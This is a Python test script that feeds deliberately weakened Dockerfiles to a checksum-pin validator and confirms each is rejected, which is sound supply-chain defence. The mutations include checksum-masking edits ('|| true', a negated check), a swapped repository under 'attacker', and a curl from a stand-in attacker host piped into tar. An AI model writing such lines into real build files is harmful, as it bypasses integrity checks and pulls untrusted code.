#!/usr/bin/env python3
"""Mutation tests proving the Dockerfile pin validator fails closed."""

from pathlib import Path
import subprocess
import sys
import tempfile


root = Path(__file__).resolve().parents[1]
dockerfile = (root / "Dockerfile").read_text()
validator = (root / "scripts/test_dockerfile_pins.py").read_text()

sdl_check = 'echo "${SDL3_SHA256}  SDL3.tar.gz" | sha256sum -c -'
ge_check = 'echo "${GE_PROTON_SHA256}  /tmp/ge-proton.tar.gz" | sha256sum -c -'
heroic_arg = "ARG HEROIC_SHA256=4c8585ad7c7a76bd3c8058aa995b9064f457603f3b6afbd9114433cf4af7ecd2\n"

mutations = {
    "negated checksum": dockerfile.replace(sdl_check, "! " + sdl_check, 1),
    "nonfatal OR fallback": dockerfile.replace(
        "rm -rf /tmp/sdl3", 'rm -rf /tmp/sdl3 || echo "ignored"', 1
    ),
    "literal OR true": dockerfile.replace(
        "rm -rf /tmp/sdl3", "rm -rf /tmp/sdl3 || true", 1
    ),
    "semicolon success masking": dockerfile.replace(
        "rm -rf /tmp/sdl3", "rm -rf /tmp/sdl3; true", 1
    ),
    "checksum failure masking": dockerfile.replace(
        sdl_check, sdl_check + " && true || true", 1
    ),
    "wrong checksum target": dockerfile.replace(
        ge_check,
        'echo "${GE_PROTON_SHA256}  /tmp/not-ge-proton.tar.gz" | sha256sum -c -',
        1,
    ),
    "wrong repository": dockerfile.replace(
        "github.com/doitsujin/dxvk/releases",
        "github.com/attacker/dxvk/releases",
        1,
    ),
    "ARG moved out of scope": dockerfile.replace(heroic_arg, "", 1),
    "missing retry policy": dockerfile.replace(
        'curl -fL --retry 8 --retry-all-errors --retry-delay 3 -o "/tmp/${HEROIC_DEB}"',
        'curl -fL -o "/tmp/${HEROIC_DEB}"',
        1,
    ),
    "version changed without checksum": dockerfile.replace(
        "ARG DXVK_VERSION=dxvk-3.0.2", "ARG DXVK_VERSION=dxvk-9.9.9", 1
    ),
    "additional unapproved curl": dockerfile.replace(
        "rm -rf /tmp/sdl3",
        "rm -rf /tmp/sdl3 && "
        "curl -fL --retry 8 --retry-all-errors --retry-delay 3 "
        '-o /tmp/unapproved "https://attacker.invalid/archive"',
        1,
    ),
    "network response piped to tar": dockerfile
    + "\nRUN curl -fL https://attacker.invalid/archive | tar -xz\n",
}

for name, mutation in mutations.items():
    if mutation == dockerfile:
        raise AssertionError(f"mutation did not alter Dockerfile: {name}")

with tempfile.TemporaryDirectory() as temporary:
    temp_root = Path(temporary)
    (temp_root / "scripts").mkdir()
    (temp_root / "scripts/test_dockerfile_pins.py").write_text(validator)

    (temp_root / "Dockerfile").write_text(dockerfile)
    baseline = subprocess.run(
        [sys.executable, str(temp_root / "scripts/test_dockerfile_pins.py")],
        text=True,
        capture_output=True,
    )
    if baseline.returncode != 0:
        raise AssertionError(f"baseline validator failed:\n{baseline.stderr}")

    failures: list[str] = []
    for name, mutation in mutations.items():
        (temp_root / "Dockerfile").write_text(mutation)
        result = subprocess.run(
            [sys.executable, str(temp_root / "scripts/test_dockerfile_pins.py")],
            text=True,
            capture_output=True,
        )
        if result.returncode == 0:
            failures.append(name)
        else:
            print(f"REJECTED: {name}")

if failures:
    print("Validator accepted unsafe mutations:", file=sys.stderr)
    for failure in failures:
        print(f"- {failure}", file=sys.stderr)
    raise SystemExit(1)

print(f"Dockerfile pin validator rejected {len(mutations)} unsafe mutations")
